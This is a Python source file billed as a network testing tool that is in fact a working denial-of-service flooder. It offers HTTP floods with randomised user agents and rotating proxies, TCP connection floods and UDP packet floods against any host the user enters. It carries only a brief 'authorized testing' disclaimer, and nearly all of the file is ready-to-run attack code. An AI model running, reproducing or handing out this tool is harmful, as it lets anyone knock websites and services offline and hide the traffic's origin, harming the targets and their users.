#!/usr/bin/env python3
"""
High-Performance Network Testing Tool
Supports both Layer 4 (TCP/UDP) and Layer 7 (HTTP) attacks
Developed by Upendra Khanal

⚠️ DISCLAIMER: This tool is for educational and authorized testing purposes only.
Do not use on systems you don't own or have explicit permission to test.
"""

import asyncio
import aiohttp
import socket
import time
import random
import sys
import os
from urllib.parse import urlparse
from typing import List, Optional
import signal

# Try to import uvloop for better performance on Unix systems
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    UVLOOP_AVAILABLE = True
except ImportError:
    UVLOOP_AVAILABLE = False

class NetworkTester:
    def __init__(self):
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0,
            'peak_rps': 0,
            'current_rps': 0,
            'last_update': 0
        }
        self.running = True
        self.proxies = []
        
    def load_proxies(self, proxy_file: str) -> List[str]:
        """Load proxies from file"""
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(proxies)} proxies")
            return proxies
        except FileNotFoundError:
            print(f"❌ Proxy file '{proxy_file}' not found")
            return []
        except Exception as e:
            print(f"❌ Error loading proxies: {e}")
            return []

    def get_random_user_agent(self) -> str:
        """Get random user agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        return random.choice(user_agents)

    def update_stats(self, success: bool = True):
        """Update request statistics"""
        self.stats['total_requests'] += 1
        if success:
            self.stats['successful_requests'] += 1
        else:
            self.stats['failed_requests'] += 1
            
        current_time = time.time()
        if current_time - self.stats['last_update'] >= 1:
            elapsed = current_time - self.stats['start_time']
            if elapsed > 0:
                self.stats['current_rps'] = self.stats['total_requests'] / elapsed
                if self.stats['current_rps'] > self.stats['peak_rps']:
                    self.stats['peak_rps'] = self.stats['current_rps']
            self.stats['last_update'] = current_time

    def print_stats(self):
        """Print current statistics"""
        elapsed = time.time() - self.stats['start_time']
        success_rate = (self.stats['successful_requests'] / max(1, self.stats['total_requests'])) * 100
        
        print(f"\r📊 Requests: {self.stats['total_requests']} | "
              f"✅ Success: {self.stats['successful_requests']} | "
              f"❌ Failed: {self.stats['failed_requests']} | "
              f"📈 Success Rate: {success_rate:.1f}% | "
              f"⚡ RPS: {self.stats['current_rps']:.1f} | "
              f"🔥 Peak RPS: {self.stats['peak_rps']:.1f} | "
              f"⏱️ Time: {elapsed:.1f}s", end='', flush=True)

    async def layer7_attack(self, url: str, num_requests: int, concurrency: int, 
                           timeout: int, custom_headers: dict, method: str = 'GET'):
        """Layer 7 HTTP flood attack"""
        print(f"\n🚀 Starting Layer 7 HTTP attack on {url}")
        print(f"📋 Method: {method} | Requests: {num_requests} | Concurrency: {concurrency}")
        
        # Test initial connection and get title
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                async with session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        # Extract title
                        title_start = content.find('<title>')
                        title_end = content.find('</title>')
                        if title_start != -1 and title_end != -1:
                            title = content[title_start + 7:title_end].strip()
                            print(f"🎯 Target: {title}")
                    print(f"✅ Initial connection successful (Status: {response.status})")
        except Exception as e:
            print(f"⚠️ Initial connection failed: {e}")
            print("Continuing with attack anyway...")

        self.stats['start_time'] = time.time()
        
        # Create semaphore to limit concurrency
        semaphore = asyncio.Semaphore(concurrency)
        
        async def make_request(session, request_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Select random proxy if available
                    proxy = random.choice(self.proxies) if self.proxies else None
                    
                    # Prepare headers
                    headers = {
                        'User-Agent': self.get_random_user_agent(),
                        **custom_headers
                    }
                    
                    # Make request based on method
                    if method.upper() == 'GET':
                        async with session.get(url, headers=headers, proxy=proxy) as response:
                            await response.read()
                    elif method.upper() == 'POST':
                        data = {'data': f'request_{request_id}'}
                        async with session.post(url, headers=headers, data=data, proxy=proxy) as response:
                            await response.read()
                    elif method.upper() == 'HEAD':
                        async with session.head(url, headers=headers, proxy=proxy) as response:
                            pass
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create session with custom timeout
        timeout_config = aiohttp.ClientTimeout(total=timeout)
        connector = aiohttp.TCPConnector(limit=concurrency * 2, limit_per_host=concurrency)
        
        async with aiohttp.ClientSession(timeout=timeout_config, connector=connector) as session:
            # Create tasks
            tasks = []
            for i in range(num_requests):
                if not self.running:
                    break
                task = asyncio.create_task(make_request(session, i))
                tasks.append(task)
                
                # Print stats every 100 requests
                if i % 100 == 0:
                    self.print_stats()
                    await asyncio.sleep(0.01)  # Small delay to prevent overwhelming
            
            # Wait for all tasks to complete
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

        print(f"\n✅ Layer 7 attack completed!")

    async def layer4_tcp_attack(self, host: str, port: int, num_connections: int, 
                               concurrency: int, timeout: int):
        """Layer 4 TCP flood attack"""
        print(f"\n🚀 Starting Layer 4 TCP attack on {host}:{port}")
        print(f"📋 Connections: {num_connections} | Concurrency: {concurrency}")
        
        self.stats['start_time'] = time.time()
        semaphore = asyncio.Semaphore(concurrency)
        
        async def tcp_connect(connection_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Create TCP connection
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(host, port),
                        timeout=timeout
                    )
                    
                    # Send some data
                    writer.write(b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n')
                    await writer.drain()
                    
                    # Keep connection open briefly
                    await asyncio.sleep(0.1)
                    
                    writer.close()
                    await writer.wait_closed()
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create tasks
        tasks = []
        for i in range(num_connections):
            if not self.running:
                break
            task = asyncio.create_task(tcp_connect(i))
            tasks.append(task)
            
            if i % 100 == 0:
                self.print_stats()
                await asyncio.sleep(0.01)
        
        # Wait for all tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            
        print(f"\n✅ Layer 4 TCP attack completed!")

    async def layer4_udp_attack(self, host: str, port: int, num_packets: int, 
                               concurrency: int, packet_size: int = 1024):
        """Layer 4 UDP flood attack"""
        print(f"\n🚀 Starting Layer 4 UDP attack on {host}:{port}")
        print(f"📋 Packets: {num_packets} | Concurrency: {concurrency} | Packet Size: {packet_size} bytes")
        
        self.stats['start_time'] = time.time()
        semaphore = asyncio.Semaphore(concurrency)
        
        # Create random payload
        payload = os.urandom(packet_size)
        
        async def send_udp_packet(packet_id):
            async with semaphore:
                if not self.running:
                    return
                    
                try:
                    # Create UDP socket
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setblocking(False)
                    
                    # Send packet
                    await asyncio.get_event_loop().sock_sendto(sock, payload, (host, port))
                    sock.close()
                    
                    self.update_stats(True)
                    
                except Exception:
                    self.update_stats(False)

        # Create tasks
        tasks = []
        for i in range(num_packets):
            if not self.running:
                break
            task = asyncio.create_task(send_udp_packet(i))
            tasks.append(task)
            
            if i % 100 == 0:
                self.print_stats()
                await asyncio.sleep(0.01)
        
        # Wait for all tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
            
        print(f"\n✅ Layer 4 UDP attack completed!")

    def signal_handler(self, signum, frame):
        """Handle Ctrl+C gracefully"""
        print(f"\n\n🛑 Stopping attack...")
        self.running = False

def main():
    print("⚡ High-Performance Network Testing Tool")
    print("Developed by Upendra Khanal")
    print("=" * 50)
    
    if UVLOOP_AVAILABLE:
        print("🚀 uvloop enabled for better performance")
    
    tester = NetworkTester()
    
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, tester.signal_handler)
    
    try:
        # Choose attack type
        print("\n🎯 Select Attack Type:")
        print("1. Layer 7 (HTTP/HTTPS)")
        print("2. Layer 4 TCP")
        print("3. Layer 4 UDP")
        
        choice = input("\nEnter your choice (1-3): ").strip()
        
        if choice == "1":
            # Layer 7 HTTP Attack
            url = input("🌐 Enter target URL (e.g., https://example.com): ").strip()
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                
            num_requests = int(input("📊 Enter number of requests to send: "))
            concurrency = int(input("⚡ Enter concurrency level (parallel connections): "))
            
            # Optional parameters
            timeout = int(input("⏱️ Enter timeout in seconds (default 10): ") or "10")
            method = input("📋 Enter HTTP method (GET/POST/HEAD, default GET): ").strip().upper() or "GET"
            
            # Custom headers
            custom_headers = {}
            add_headers = input("🔧 Add custom headers? (y/n): ").strip().lower()
            if add_headers == 'y':
                while True:
                    header = input("Enter header (format: 'Name: Value', empty to finish): ").strip()
                    if not header:
                        break
                    if ':' in header:
                        name, value = header.split(':', 1)
                        custom_headers[name.strip()] = value.strip()
            
            # Proxy support
            proxy_file = input("📁 Enter proxy file path (optional, press Enter to skip): ").strip()
            if proxy_file:
                tester.proxies = tester.load_proxies(proxy_file)
            
            # Run Layer 7 attack
            asyncio.run(tester.layer7_attack(url, num_requests, concurrency, timeout, custom_headers, method))
            
        elif choice == "2":
            # Layer 4 TCP Attack
            target = input("🎯 Enter target (host:port or just host): ").strip()
            if ':' in target:
                host, port = target.split(':', 1)
                port = int(port)
            else:
                host = target
                port = int(input("🔌 Enter port number: "))
                
            num_connections = int(input("📊 Enter number of connections: "))
            concurrency = int(input("⚡ Enter concurrency level: "))
            timeout = int(input("⏱️ Enter timeout in seconds (default 5): ") or "5")
            
            # Run Layer 4 TCP attack
            asyncio.run(tester.layer4_tcp_attack(host, port, num_connections, concurrency, timeout))
            
        elif choice == "3":
            # Layer 4 UDP Attack
            target = input("🎯 Enter target (host:port or just host): ").strip()
            if ':' in target:
                host, port = target.split(':', 1)
                port = int(port)
            else:
                host = target
                port = int(input("🔌 Enter port number: "))
                
            num_packets = int(input("📊 Enter number of packets: "))
            concurrency = int(input("⚡ Enter concurrency level: "))
            packet_size = int(input("📦 Enter packet size in bytes (default 1024): ") or "1024")
            
            # Run Layer 4 UDP attack
            asyncio.run(tester.layer4_udp_attack(host, port, num_packets, concurrency, packet_size))
            
        else:
            print("❌ Invalid choice!")
            return
            
    except KeyboardInterrupt:
        print(f"\n\n🛑 Attack stopped by user")
    except ValueError as e:
        print(f"❌ Invalid input: {e}")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    # Final stats
    if tester.stats['total_requests'] > 0:
        print(f"\n📈 Final Statistics:")
        print(f"   Total Requests/Connections: {tester.stats['total_requests']}")
        print(f"   Successful: {tester.stats['successful_requests']}")
        print(f"   Failed: {tester.stats['failed_requests']}")
        success_rate = (tester.stats['successful_requests'] / tester.stats['total_requests']) * 100
        print(f"   Success Rate: {success_rate:.1f}%")
        print(f"   Peak RPS: {tester.stats['peak_rps']:.1f}")
        elapsed = time.time() - tester.stats['start_time']
        print(f"   Total Time: {elapsed:.1f} seconds")

if __name__ == "__main__":
    main()